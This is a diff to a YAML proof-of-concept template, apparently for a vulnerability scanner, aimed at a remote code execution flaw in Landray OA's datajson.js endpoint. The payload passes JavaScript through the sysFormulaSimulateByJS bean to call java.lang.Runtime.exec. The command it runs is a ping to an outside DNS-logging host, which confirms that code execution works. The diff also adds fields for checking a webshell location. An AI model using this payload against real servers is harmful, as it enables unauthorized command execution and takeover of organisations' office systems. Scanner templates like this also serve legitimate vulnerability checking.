@@ -2,17 +2,13 @@
 - name:
   - name: "LandrayOA_datajson_rce"
 
-#种类：poc对应的是scan.py
-- type:
-  - type: "poc"
-
 #请求方式
 - method:
   - method: "get"
 
 #payload
 - payload:
-  - s_bean: 'sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 cd1d5369.ipv6.1433.eu.org")'
+  - payload: 's_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 cd1d5369.ipv6.1433.eu.org")'
 
 #response包里的关键字
 - word:
@@ -22,3 +18,11 @@
 #漏洞的位置
 - url:
   - url : "/data/sys-common/datajson.js"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
